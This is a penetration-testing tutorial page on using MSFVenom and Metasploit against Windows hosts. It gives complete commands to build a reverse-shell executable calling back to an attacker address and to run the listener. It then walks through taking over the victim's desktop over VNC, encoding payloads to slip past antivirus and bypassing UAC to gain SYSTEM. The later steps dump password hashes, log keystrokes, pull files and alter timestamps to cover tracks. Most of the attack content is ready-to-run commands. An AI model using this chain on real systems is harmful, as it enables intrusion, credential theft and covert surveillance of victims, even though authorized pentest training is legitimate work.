---
path: "/tutorials/securitypentesttools/msfvenom"
date: "2020-04-06"
title: "MSFVenom"
---

MSFVenom is a tool used to create malicious payloads for the Metasploit framework. The Metasploit framework is a tool for developing and executing remote exploits on a vulnerable target. Tools within the framework allow you to complete various stages of a penetration test.

#### Establishing a VNC Session
MSFVenom can be used to create lots of different types of payload. One of these can be used to establish a VNC session on a remote host. Virtual Network Computing (VNC) is a system that allows remote graphical connections to a host, this allows you to use the device remotely as though you were sitting in front of it. There are a number of VNC variants offering different features. Establishing a malicious VNC session on a target machine gives you a good foothold in a target network.

Generating a payload is simple enough:

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attackerIP> LPORT=<myPort> -o /root/Desktop/evil.exe
```
* *-p* - Specifies the payload we'd like to use. There are a large number of payloads to choose from.
* *--platform* - This is where you choose the platform the payload is for. Use the man page to discover the available payloads.
* *-a* - Architecture the exploit will run on.
* *-f* - The format of the output file
* *LHOST* - For this exploit this is how you specify the IP address of the listening machine
* *LPORT* - Similar to the above this is how you specify the port the listener will listen on.
* *-o* - The name and location of the output file.

This will generate an exe file that can run on Windows. 

We'll now start the listener on our attacker machine.

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attackerIP>
set LPORT <myPort>
exploit
```

The listener is now setup.

During a normal penetration test you would have to find a way to get the file onto a target machine, this is the tricky part but I won't be telling you how to do it.

Once the user runs your exe file the system will be compromised. You'll see that the listener opens a meterpreter session and displays the IP and port of the listener and the victim.

Now we can use the established connection to tamper with the victim machine.

```bash
session -i 1
sysinfo
run vnc
```
* *session -i 1* - This ensures we are using session 1.
* *sysinfo* - Displays basic information about the system the session is open on.
* *run vnc* - Opens up a VNC session on the infected machine. Once this command is run you will see a screen appear showing the user's desktop.

**N.B** The exploit that we have created using MSFVenom will likely be caught by most standard antivirus tools. The are methods to reduce the chance of detection, but I won't go into detail for this section.




#### Escalating Privileges
Escalating privilege is an essential part of any penetration test. This allows you to compromise a normal user account and then increase your level of privilege, enabling you to perform further actions on your victim's network/device.

To generate the exploit generate our payload we'll use the following command:
```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" -f exe LHOST=<attackerIP> -f Desktop/escalation.exe
```

This is similar to the command we used to create the previous payload with a few key differences.

* *-e* - Sets the encoding on the output file. This can help to avoid detection by antivirus, however, a lot of scanners will still detect this.
* *-b* - You can provide a list of characters to avoid.
* *-f* - Where you're outputting the file.

Start the listener on our attacker machine.

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attackerIP>
set LPORT <myPort>
exploit -j -z
```

Again you'll have to figure out how to get this onto the target machine. Once the target has run the exe you'll have a session established with the target. Make the session interactive and grab the current user's username.

```bash
session -i 1
getuid
```

Depending on the user's privilege level you won't be able to perform administrator type actions. We now want to escalate our privileges so that we 'own' the system.

```bash
background
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
```

* *background* - Sends the current session to the background so you can perform the next tasks.
* *use exploit/windows/local/bypassuac_fodhelper* - Sets the exploit you want to use.
* *set SESSION 1* - Sets the SESSION variable for the exploit. **N.B.** Different exploits use different variables, to see the available options and a description use the `show options` command.

```bash
set payload windows/meterpreter/reverse_tcp
set LHOST <attackerIP>
set LPORT <myPort>
set TARGET 0
exploit
```

You should now have a new meterpreter session open.

```bash
getsystem -t 1
```
This should have escalated your privileges to the 'SYSTEM' account. If you use `getuid` you should see the username is now SYSTEM.

We can now dump the password hashes of users on the system as well as password hints.

```bash
run post/windows/gather/smart_hashdump
```

If this command works then you have successfully escalated you privilege. Well done!

####Post Exploitation Activities
So you've compromised a device and escalated your privileges, now what?

Well you can do any number of things. I'll show you some of the things you might want to do. 

* *ls* - Lists the current directory contents.
* *cd* - Change directory.
* *pwd* - Prints the current directory.
* *timestomp secret.txt -v* Alters the Modified, Access, Created, Entry Modified (MACE) attributes.
* *download myFile.doc* - Downloads the specified document to your machine.
* *search -f "myFile.doc"* - Searches for files on the system. You can search in specific folders or the whole system.
* *keyscan_start* - Initiates key capturing on the victim.
* *keyscan_dump* - Dumps the keystrokes to the terminal
* *idletime* - Displays the time, in seconds, the system has been idle.
* *shutdown* - Shutdowns the victim's machine.